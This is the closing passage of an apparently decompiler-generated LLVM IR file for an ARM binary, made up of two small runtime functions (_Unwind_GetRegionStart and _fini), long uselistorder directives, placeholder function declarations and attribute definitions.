1201, 323, 322, 324, 325, 854, 316, 855, 179, 176, 177, 175, 178, 856, 196, 195, 192, 193, 194, 190, 191, 857, 155, 156, 163, 164, 159, 160, 161, 162, 157, 158, 858, 297, 296, 860, 859, 473, 474, 861, 651, 1095, 287, 288, 286, 258, 257, 1403, 630, 694, 1404, 6, 5, 862, 429, 425, 423, 424, 430, 427, 428, 431, 426, 422, 695, 226, 863, 560, 561, 559, 865, 864, 1188, 696, 1189, 1190, 1191, 1192, 1193, 866, 74, 75, 73, 76, 1152, 413, 412, 631, 1295, 1296, 1297, 1298, 869, 868, 867, 268, 270, 267, 269, 596, 642, 597, 1353, 1354, 1355, 1356, 632, 870, 61, 872, 871, 562, 563, 1226, 873, 1121, 1122, 260, 261, 1123, 874, 476, 477, 478, 475, 1136, 1137, 1138, 1406, 1140, 1139, 580, 875, 610, 1141, 1408, 611, 1409, 1410, 1411, 1412, 1413, 1414, 998, 1415, 1416, 1417, 1418, 1419, 1420, 999, 734, 877, 876, 208, 212, 214, 210, 209, 211, 213, 217, 215, 216, 1223, 1202, 1221, 1222, 638, 612, 129, 132, 130, 131, 697, 1203, 1204, 1219, 1220, 878, 735, 153, 154, 1211, 1000, 1212, 1213, 1001, 1214, 1215, 1216, 1217, 1218, 166, 167, 168, 170, 173, 171, 169, 172, 165, 174, 1205, 1206, 1207, 698, 1208, 1209, 1210, 879, 483, 481, 484, 479, 486, 480, 482, 485, 487, 1224, 1225, 880, 311, 310, 307, 306, 305, 309, 308, 312, 1142, 1143, 1144, 1145, 881, 339, 340, 338, 342, 341, 343, 882, 488, 1097, 699, 1096, 639, 885, 884, 883, 491, 497, 489, 493, 492, 496, 494, 495, 498, 490, 700, 1098, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 613, 886, 502, 499, 500, 505, 501, 503, 504, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 887, 95, 100, 98, 96, 99, 97, 101, 701, 1153, 888, 354, 1146, 1147, 1148, 1149, 1150, 702, 889, 67, 68, 70, 69, 71, 703, 65, 1099, 890, 390, 389, 704, 1100, 891, 314, 315, 705, 892, 255, 253, 254, 1101, 284, 283, 282, 893, 266, 264, 265, 894, 414, 895, 278, 277, 896, 897, 187, 186, 898, 376, 899, 900, 188, 189, 1421, 1422, 1423, 706, 1424, 1425, 707, 1426, 903, 902, 901, 46, 48, 54, 47, 52, 51, 55, 53, 49, 50, 904, 256, 708, 905, 506, 507, 508, 56, 906, 515, 513, 514, 512, 509, 510, 511, 907, 300, 301, 299, 302, 298, 909, 908, 910, 259, 911, 408, 410, 409, 411, 614, 912, 516, 1102, 709, 710, 1103, 1104, 1105, 328, 329, 327, 332, 331, 330, 334, 333, 913, 24, 27, 25, 26, 23, 22, 20, 21, 573, 581, 1302, 914, 31, 28, 29, 30, 32, 33, 1303, 1304, 1305, 1306, 1307, 1308, 915, 518, 517, 525, 524, 519, 526, 522, 523, 520, 521, 527, 528, 344, 588, 1009, 1010, 1011, 916, 917, 598, 1180, 599, 1181, 1182, 589, 1183, 530, 534, 529, 532, 533, 537, 536, 535, 531, 1184, 918, 393, 391, 397, 392, 396, 395, 398, 394, 600, 1106, 36, 35, 34, 37, 1299, 633, 1300, 920, 919, 42, 40, 39, 38, 44, 45, 43, 41, 921, 17, 19, 15, 13, 14, 16, 18, 922, 923, 1427, 634, 711, 925, 924, 926, 1309, 1312, 1313, 1314, 927, 538, 543, 544, 542, 541, 545, 539, 540, 1315, 1316, 1317, 1318, 928, 550, 556, 549, 555, 554, 548, 557, 558, 552, 546, 551, 547, 553, 1310, 1311, 712, 929, 281, 280, 1319, 1320, 1321, 1322, 1323, 1324, 652, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 714, 1333, 1334, 1335, 1336, 1337, 713, 1338, 1339, 1340, 1341, 1342, 930, 379, 381, 377, 380, 384, 386, 383, 385, 387, 382, 388, 378, 350, 349, 715, 716, 591, 934, 933, 932, 931, 313, 935, 352, 351, 936, 937, 564, 938, 939, 565, 940, 263, 262, 941, 942, 566, 943, 1251, 1252, 143, 144, 615, 1407, 1196, 1195, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1428, 355, 356, 944, 945, 946, 241, 240, 947, 948, 353, 949, 567, 271, 950, 285, 951, 239, 336, 335, 952, 180, 181, 279, 574, 1405, 228, 227, 1107, 582, 601, 1108, 1109, 1110, 575, 1111, 1112, 1113, 653, 1114, 1115, 1116, 1117, 717, 718, 654, 719, 958, 957, 956, 955, 954, 953, 720, 1118, 1119, 960, 959, 1124, 1125, 961, 1301, 967, 966, 965, 964, 963, 962, 1343, 721, 968, 659, 722, 723, 1344, 724, 1345, 976, 975, 974, 973, 972, 971, 970, 969, 635, 1346, 1347, 1348, 725, 583, 1349, 1350, 1351, 726, 1352, 979, 978, 977, 736, 1357, 1358, 983, 982, 981, 980, 1359, 1360, 727, 1370, 1371, 640, 1372, 985, 984, 655, 7, 989, 988, 987, 986, 617, 1361, 1362, 1363, 616, 1364, 1368, 1369, 728, 990, 729, 1365, 1366, 1367, 991, 66, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 993, 992, 140, 1381, 994, 72, 995, 996, 568 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_189e0 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_189e8 = add i32 %tmp1, 72
  %v2_189e8 = inttoptr i32 %v1_189e8 to i32*
  %v3_189e8 = load i32, i32* %v2_189e8, align 4
  ret i32 %v3_189e8

; uselistorder directives
  uselistorder i32 72, { 15, 16, 0, 17, 8, 9, 1, 12, 13, 10, 11, 2, 3, 5, 6, 14, 4, 7 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 14, 13, 16, 15, 136, 137, 138, 139, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 68, 75, 12, 76, 51, 78, 7, 9, 10, 79, 80, 2, 0, 1, 90, 52, 18, 19, 55, 20, 77, 53, 54, 140, 81, 82, 83, 84, 85, 21, 86, 74, 22, 91, 92, 87, 17, 141, 142, 143, 144, 145, 147, 148, 146, 149, 150, 151, 152, 153, 154, 155, 23, 24, 25, 26, 28, 27, 29, 88, 89, 30, 31, 69, 70, 71, 72, 73, 56, 57, 32, 58, 59, 60, 156, 11, 4, 61, 63, 64, 62, 94, 93, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 3, 33, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 132, 125, 126, 127, 128, 129, 130, 131, 133, 134, 34, 135, 8, 65, 66, 5, 67, 95, 6, 96, 35 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_189fc = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_189fc)
  %v31_18a04 = load i32, i32* @r0, align 4
  ret i32 %v31_18a04

; uselistorder directives
  uselistorder i32* @r0, { 28, 29, 30, 300, 301, 123, 117, 118, 119, 120, 121, 122, 31, 26, 124, 97, 125, 5, 98, 126, 127, 96, 99, 128, 32, 27, 129, 130, 131, 132, 114, 33, 115, 116, 34, 35, 133, 134, 135, 136, 137, 138, 25, 139, 140, 36, 141, 142, 6, 202, 204, 101, 203, 2, 7, 143, 144, 93, 94, 145, 146, 147, 95, 148, 149, 150, 37, 151, 152, 153, 154, 38, 215, 214, 155, 156, 157, 71, 158, 159, 160, 8, 9, 161, 162, 10, 12, 0, 1, 163, 164, 11, 165, 166, 167, 40, 100, 168, 169, 170, 171, 172, 39, 173, 18, 174, 175, 4, 176, 177, 216, 41, 217, 218, 219, 13, 42, 43, 302, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 232, 233, 234, 246, 247, 248, 249, 250, 251, 252, 253, 254, 104, 255, 178, 256, 257, 258, 260, 259, 19, 20, 44, 238, 182, 242, 183, 303, 306, 307, 179, 62, 304, 305, 308, 310, 14, 63, 64, 235, 102, 236, 237, 103, 65, 261, 262, 263, 264, 265, 66, 195, 196, 197, 21, 311, 22, 70, 206, 3, 207, 23, 241, 45, 240, 46, 239, 180, 181, 243, 244, 245, 47, 205, 208, 209, 210, 211, 212, 213, 48, 49, 184, 185, 186, 50, 51, 52, 53, 54, 312, 309, 314, 108, 109, 110, 111, 55, 296, 297, 15, 56, 57, 266, 267, 16, 58, 59, 112, 113, 313, 231, 60, 268, 269, 270, 271, 187, 188, 278, 61, 105, 106, 279, 17, 280, 281, 282, 283, 284, 285, 286, 287, 272, 77, 273, 291, 68, 292, 289, 69, 290, 274, 67, 73, 24, 72, 74, 299, 293, 75, 294, 76, 189, 190, 191, 192, 193, 194, 198, 199, 200, 201, 275, 276, 277, 288, 295, 298, 107, 78, 79, 80, 81, 82, 83, 84, 92, 85, 86, 87, 88, 89, 90, 91 }
  uselistorder void (i32)* @__pseudo_branch, { 16, 100, 93, 94, 95, 96, 97, 98, 99, 101, 102, 103, 17, 18, 19, 20, 21, 0, 71, 72, 73, 52, 53, 54, 43, 44, 45, 104, 59, 60, 61, 62, 63, 64, 55, 56, 57, 58, 65, 66, 41, 42, 22, 67, 68, 69, 70, 46, 47, 48, 49, 50, 51, 23, 24, 25, 26, 27, 28, 105, 110, 111, 112, 113, 114, 115, 116, 106, 120, 121, 122, 123, 29, 30, 31, 77, 78, 79, 80, 81, 82, 83, 84, 85, 107, 108, 109, 1, 74, 75, 76, 32, 33, 34, 35, 36, 37, 38, 39, 40, 117, 118, 119, 86, 87, 88, 89, 90, 91, 124, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 92 }
  uselistorder i32 0, { 425, 424, 484, 485, 1463, 429, 428, 486, 1464, 1465, 1466, 1467, 363, 362, 487, 1468, 1469, 240, 1470, 1472, 1473, 164, 165, 1474, 1475, 1471, 97, 98, 99, 100, 2, 1, 3, 0, 229, 228, 230, 231, 232, 1476, 426, 427, 155, 145, 1477, 1478, 234, 235, 233, 236, 1479, 1480, 1481, 1482, 239, 238, 237, 1483, 1484, 1485, 415, 414, 488, 430, 489, 431, 490, 432, 491, 492, 493, 166, 1486, 446, 445, 1487, 1488, 444, 443, 1489, 494, 441, 442, 439, 440, 438, 437, 1490, 436, 435, 434, 433, 368, 1491, 1507, 1492, 243, 1493, 1494, 1495, 1496, 1497, 1498, 245, 1500, 1501, 241, 242, 1502, 1503, 140, 167, 1504, 1505, 613, 101, 102, 416, 417, 244, 1499, 1506, 367, 1508, 495, 496, 1509, 448, 447, 246, 1510, 1511, 247, 1512, 1513, 1514, 122, 497, 498, 1515, 248, 1516, 1517, 1518, 249, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 36, 141, 499, 1529, 250, 1530, 1531, 1532, 4, 1533, 1534, 5, 1535, 1536, 6, 691, 7, 692, 693, 614, 479, 480, 694, 695, 696, 697, 698, 699, 700, 9, 10, 11, 701, 702, 8, 703, 704, 615, 12, 705, 706, 37, 616, 707, 708, 709, 710, 711, 712, 713, 714, 118, 117, 251, 252, 253, 715, 716, 717, 13, 718, 719, 38, 720, 721, 722, 39, 40, 220, 723, 724, 725, 726, 41, 221, 500, 727, 728, 729, 730, 731, 732, 42, 733, 15, 14, 43, 617, 734, 619, 618, 735, 736, 737, 738, 739, 16, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 620, 690, 740, 741, 742, 743, 744, 17, 745, 621, 746, 747, 748, 749, 222, 223, 501, 750, 751, 19, 18, 752, 753, 754, 755, 756, 757, 758, 622, 623, 759, 625, 760, 761, 626, 627, 762, 763, 624, 764, 628, 765, 629, 766, 767, 768, 769, 20, 1054, 1055, 1056, 1057, 156, 1058, 254, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 255, 630, 633, 631, 632, 1066, 1067, 1068, 1069, 1070, 1071, 157, 770, 771, 772, 773, 774, 775, 256, 119, 410, 776, 777, 778, 779, 634, 780, 781, 782, 502, 783, 784, 785, 635, 786, 787, 788, 789, 1072, 1073, 55, 56, 1082, 1083, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1084, 257, 168, 636, 790, 57, 169, 791, 792, 369, 170, 637, 371, 793, 58, 142, 794, 795, 370, 796, 797, 798, 799, 800, 259, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 172, 171, 260, 261, 813, 814, 815, 816, 817, 818, 173, 174, 819, 820, 821, 822, 823, 824, 44, 825, 826, 827, 828, 829, 59, 262, 830, 175, 504, 831, 832, 833, 834, 835, 505, 263, 836, 837, 838, 839, 454, 840, 841, 842, 453, 843, 844, 452, 845, 846, 258, 847, 503, 848, 265, 849, 45, 850, 449, 418, 851, 852, 853, 506, 507, 854, 855, 856, 450, 451, 857, 858, 859, 264, 860, 861, 862, 863, 864, 865, 866, 21, 867, 868, 869, 638, 870, 871, 872, 873, 874, 875, 877, 876, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 893, 892, 372, 894, 895, 176, 896, 1091, 1086, 1087, 1088, 1089, 267, 1090, 266, 1118, 268, 1125, 1126, 1127, 146, 1128, 147, 1129, 148, 1130, 149, 1131, 269, 1132, 1133, 270, 897, 898, 272, 899, 900, 271, 901, 273, 902, 903, 373, 904, 274, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 177, 915, 916, 917, 918, 920, 921, 919, 922, 178, 923, 926, 924, 925, 275, 508, 927, 928, 929, 276, 277, 930, 931, 932, 933, 934, 935, 509, 936, 937, 510, 938, 940, 278, 939, 374, 364, 941, 942, 944, 179, 945, 280, 946, 106, 107, 104, 105, 947, 511, 158, 150, 948, 949, 950, 283, 281, 282, 512, 951, 952, 953, 103, 279, 954, 955, 956, 957, 958, 959, 960, 961, 962, 513, 159, 406, 120, 963, 964, 965, 22, 284, 669, 670, 162, 108, 143, 943, 375, 224, 966, 989, 990, 1134, 1136, 1137, 1139, 1138, 285, 1140, 1141, 23, 160, 1537, 514, 1538, 1142, 286, 1143, 1144, 288, 289, 123, 124, 1145, 287, 1146, 1147, 1148, 1149, 180, 181, 1150, 1151, 1152, 290, 1153, 1154, 419, 1155, 1156, 515, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 109, 1164, 1165, 125, 1193, 1194, 1195, 1196, 1197, 1198, 376, 1199, 1200, 1201, 1211, 1202, 1272, 1301, 1302, 1303, 1210, 516, 182, 1304, 455, 408, 409, 517, 1305, 1306, 1307, 1309, 1310, 1311, 1312, 46, 1313, 1314, 60, 377, 420, 1315, 1316, 1317, 1318, 1321, 1322, 1323, 1324, 1325, 1326, 291, 1327, 639, 1328, 1319, 1308, 640, 365, 641, 1320, 1329, 1330, 1331, 61, 1333, 62, 1332, 183, 1334, 1335, 292, 967, 968, 969, 970, 971, 126, 972, 973, 293, 974, 47, 294, 975, 518, 976, 977, 411, 295, 296, 519, 520, 298, 1336, 1337, 1338, 1339, 1340, 299, 297, 521, 522, 1341, 1342, 1343, 1344, 300, 523, 1345, 524, 63, 64, 65, 66, 481, 301, 1346, 151, 1347, 303, 302, 525, 526, 1348, 1349, 1350, 1042, 1043, 378, 1212, 1213, 1214, 1215, 1216, 1220, 1217, 1218, 1219, 24, 379, 110, 1221, 527, 1222, 1223, 1224, 456, 457, 991, 992, 528, 1135, 529, 978, 1203, 1273, 1274, 1275, 998, 999, 25, 530, 979, 184, 531, 1539, 1540, 1541, 26, 27, 185, 186, 187, 1556, 1557, 188, 28, 980, 189, 1559, 190, 1204, 532, 304, 1205, 1206, 1207, 1208, 1209, 191, 314, 313, 308, 312, 305, 307, 306, 309, 311, 310, 1119, 1120, 1121, 1122, 533, 1351, 1352, 1353, 315, 316, 1354, 1355, 1356, 1357, 1358, 1359, 317, 1360, 192, 1442, 1443, 1444, 1445, 319, 318, 320, 1446, 1276, 321, 322, 1044, 1045, 144, 67, 1560, 111, 380, 1564, 1565, 68, 1092, 127, 1093, 1094, 1095, 381, 1566, 1567, 1568, 1569, 1570, 1573, 1574, 1575, 1576, 1577, 1578, 1579, 1580, 1581, 1582, 1571, 1572, 1583, 1584, 1585, 1586, 1587, 1588, 1589, 1590, 48, 1591, 1592, 1593, 1594, 1595, 49, 1596, 1597, 1598, 50, 1599, 1600, 1601, 51, 1602, 1603, 1604, 1605, 1606, 1607, 1608, 1609, 1610, 1611, 1612, 1613, 1614, 1615, 1616, 1617, 1618, 1619, 1620, 1621, 1622, 1623, 1624, 1625, 1628, 1629, 1630, 1631, 1632, 1633, 1634, 1626, 1627, 1635, 1636, 1637, 1638, 1639, 1640, 1641, 1642, 1643, 1644, 52, 1645, 1646, 1647, 1648, 1649, 53, 1650, 1651, 1652, 1653, 1654, 54, 1655, 1656, 1657, 1658, 1659, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 1667, 1668, 1669, 323, 1225, 642, 1226, 1265, 1227, 1228, 1262, 534, 535, 1263, 1264, 193, 194, 327, 1229, 325, 1230, 1251, 1244, 643, 1245, 1246, 1247, 1248, 69, 70, 130, 1249, 1250, 382, 1252, 1253, 644, 1254, 324, 1255, 71, 72, 129, 1256, 1257, 645, 1258, 1259, 73, 74, 128, 1260, 326, 1261, 1231, 646, 1232, 1233, 536, 1234, 1235, 647, 1236, 1237, 1240, 1238, 1239, 383, 1241, 75, 76, 132, 1242, 648, 77, 78, 131, 1243, 1266, 649, 1267, 1268, 1269, 1270, 1271, 1096, 650, 1097, 1098, 1099, 1100, 982, 981, 386, 984, 985, 983, 384, 385, 986, 987, 537, 988, 1277, 1278, 651, 1279, 1280, 1281, 652, 1282, 1283, 79, 80, 133, 1284, 1285, 1286, 112, 113, 1287, 1288, 1289, 328, 1290, 1291, 1292, 1293, 1294, 538, 1295, 1296, 1297, 1298, 1299, 1300, 1166, 653, 1167, 1168, 81, 82, 135, 1169, 1170, 1171, 654, 1172, 1173, 1174, 1175, 655, 1176, 1177, 83, 84, 134, 1178, 1179, 1180, 1181, 1182, 329, 331, 1123, 330, 1124, 332, 1085, 195, 1101, 1106, 1107, 1102, 1103, 1104, 1109, 1110, 1111, 333, 1112, 1113, 1114, 1115, 1116, 1105, 1108, 1117, 196, 993, 994, 995, 334, 996, 997, 335, 1000, 1004, 1005, 1006, 1007, 336, 1001, 337, 1002, 1003, 197, 1008, 1028, 1670, 1671, 1672, 1542, 1543, 1544, 338, 1545, 1369, 1460, 1010, 1009, 1011, 1673, 1674, 339, 1675, 1676, 1558, 1370, 1371, 412, 413, 539, 1681, 659, 1682, 540, 1683, 1684, 541, 1685, 1686, 657, 340, 388, 1687, 658, 1688, 542, 114, 1689, 1690, 543, 1703, 1704, 1707, 656, 387, 1708, 458, 199, 198, 1705, 1706, 1677, 1678, 660, 341, 366, 671, 29, 30, 1699, 1448, 1361, 1691, 1692, 1693, 1694, 544, 1695, 200, 1461, 1462, 152, 1012, 1013, 661, 1014, 545, 1015, 1016, 1017, 1018, 1019, 85, 86, 136, 1020, 87, 88, 137, 1372, 1373, 121, 390, 1377, 1374, 1375, 662, 1376, 1378, 663, 1379, 1380, 1381, 1382, 89, 90, 138, 1383, 342, 1384, 1385, 1386, 1388, 1387, 389, 672, 674, 673, 343, 675, 676, 677, 546, 678, 201, 1679, 1680, 1183, 1184, 1185, 1186, 1187, 1188, 345, 202, 1189, 1190, 1191, 153, 344, 1192, 1024, 1025, 547, 1021, 203, 1022, 204, 1023, 346, 1363, 1364, 1365, 31, 1362, 205, 206, 207, 154, 1026, 208, 209, 549, 550, 1698, 548, 210, 211, 1394, 1395, 1396, 1397, 1398, 347, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 348, 1389, 551, 1390, 1391, 552, 1392, 1393, 212, 1406, 1407, 352, 350, 351, 1408, 1409, 358, 357, 226, 349, 1410, 1411, 1412, 1413, 1414, 1415, 422, 421, 459, 553, 1416, 1417, 1418, 115, 1419, 354, 353, 355, 356, 225, 1420, 1421, 391, 1422, 1423, 163, 1424, 1425, 1426, 1427, 1428, 32, 33, 1029, 1030, 116, 1366, 1368, 1367, 1439, 1438, 1430, 1432, 1431, 1447, 213, 1561, 1562, 1563, 392, 34, 1709, 1710, 139, 554, 555, 359, 1031, 1032, 556, 1441, 1440, 1033, 1046, 1034, 1696, 1697, 1700, 1701, 1702, 1027, 35, 1546, 1547, 1548, 161, 1549, 1550, 1551, 1552, 1553, 360, 1554, 664, 667, 665, 666, 1555, 668, 423, 561, 562, 393, 91, 460, 557, 227, 558, 559, 461, 560, 1035, 563, 1036, 564, 565, 1037, 1038, 566, 1039, 482, 1040, 567, 1041, 568, 214, 462, 569, 463, 361, 1047, 1048, 570, 1049, 1051, 571, 572, 1050, 394, 1052, 1053, 464, 574, 575, 573, 576, 578, 577, 579, 1429, 465, 466, 467, 468, 1433, 1434, 582, 580, 581, 395, 1435, 583, 1436, 1437, 92, 589, 93, 588, 584, 587, 397, 590, 585, 586, 396, 591, 469, 215, 592, 593, 594, 595, 596, 1459, 216, 94, 407, 398, 472, 473, 1449, 1450, 1451, 399, 470, 471, 474, 1452, 1453, 475, 1454, 1455, 401, 95, 217, 218, 400, 1457, 1458, 483, 219, 96, 597, 1456, 598, 402, 599, 600, 404, 403, 601, 405, 1711, 476, 679, 477, 478, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 1712, 1713, 1714, 1715, 1716, 1717, 1718, 1719, 1720, 1721, 1722, 1723, 1724, 1725, 1726 }
  uselistorder i32* @r4, { 84, 664, 665, 666, 667, 668, 686, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 13, 683, 684, 685, 687, 688, 689, 690, 691, 65, 692, 693, 88, 14, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 85, 86, 87, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 10, 115, 116, 117, 118, 119, 15, 120, 121, 291, 17, 292, 16, 293, 294, 295, 122, 123, 18, 124, 125, 126, 19, 127, 20, 128, 129, 130, 131, 132, 8, 133, 0, 134, 135, 136, 1, 296, 59, 300, 327, 328, 329, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 137, 138, 139, 140, 21, 141, 142, 143, 144, 145, 60, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 22, 193, 194, 195, 196, 197, 73, 74, 75, 180, 181, 63, 55, 182, 198, 199, 200, 350, 351, 352, 353, 354, 355, 356, 694, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 5, 394, 395, 396, 397, 398, 399, 400, 401, 402, 23, 403, 404, 482, 425, 426, 427, 513, 514, 515, 428, 429, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 6, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 24, 26, 214, 25, 215, 536, 537, 538, 539, 542, 2, 540, 541, 11, 56, 543, 548, 549, 544, 545, 546, 547, 483, 484, 485, 486, 430, 27, 431, 432, 433, 28, 434, 435, 436, 437, 438, 439, 440, 3, 29, 441, 442, 443, 444, 445, 446, 447, 448, 223, 224, 349, 216, 405, 406, 487, 488, 489, 490, 695, 217, 218, 219, 66, 697, 698, 699, 9, 702, 696, 407, 408, 409, 410, 411, 412, 413, 414, 415, 30, 416, 417, 418, 419, 420, 421, 422, 423, 424, 330, 331, 332, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 661, 662, 491, 492, 493, 494, 495, 496, 497, 498, 499, 285, 286, 287, 288, 289, 290, 703, 704, 301, 302, 31, 7, 303, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 32, 449, 476, 477, 450, 451, 452, 453, 454, 473, 33, 474, 475, 67, 455, 456, 458, 34, 459, 462, 35, 463, 464, 36, 465, 466, 37, 467, 468, 38, 469, 470, 39, 471, 61, 472, 68, 457, 478, 479, 40, 480, 481, 304, 305, 306, 307, 308, 460, 461, 220, 221, 222, 500, 501, 502, 503, 504, 41, 505, 42, 43, 506, 507, 508, 509, 510, 511, 512, 380, 381, 44, 382, 383, 45, 384, 385, 46, 386, 387, 47, 388, 389, 48, 390, 391, 49, 392, 393, 333, 334, 335, 336, 297, 298, 299, 309, 310, 311, 50, 312, 313, 314, 51, 315, 316, 317, 318, 319, 320, 57, 321, 322, 323, 324, 325, 326, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 12, 235, 236, 237, 238, 700, 701, 69, 721, 587, 588, 64, 725, 58, 726, 727, 728, 744, 746, 747, 748, 745, 729, 734, 742, 743, 722, 735, 736, 737, 738, 70, 730, 731, 71, 52, 239, 53, 240, 241, 242, 589, 76, 77, 78, 79, 80, 81, 723, 724, 257, 258, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 564, 567, 568, 569, 570, 565, 566, 571, 572, 573, 574, 575, 576, 253, 254, 255, 256, 259, 260, 261, 262, 263, 264, 732, 733, 265, 266, 267, 268, 590, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 54, 608, 609, 610, 611, 591, 592, 593, 594, 595, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 62, 625, 626, 4, 627, 628, 629, 630, 631, 632, 269, 270, 271, 577, 578, 579, 580, 581, 582, 583, 646, 647, 648, 649, 650, 651, 652, 637, 638, 639, 640, 641, 642, 643, 644, 645, 72, 584, 585, 586, 272, 273, 274, 275, 653, 654, 655, 658, 659, 660, 656, 657, 739, 740, 741, 276, 277, 278, 279, 280, 281, 282, 283, 284, 633, 634, 635, 636, 82, 83, 663 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i8** @__decompiler_undefined_function_5() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_8() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_9() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
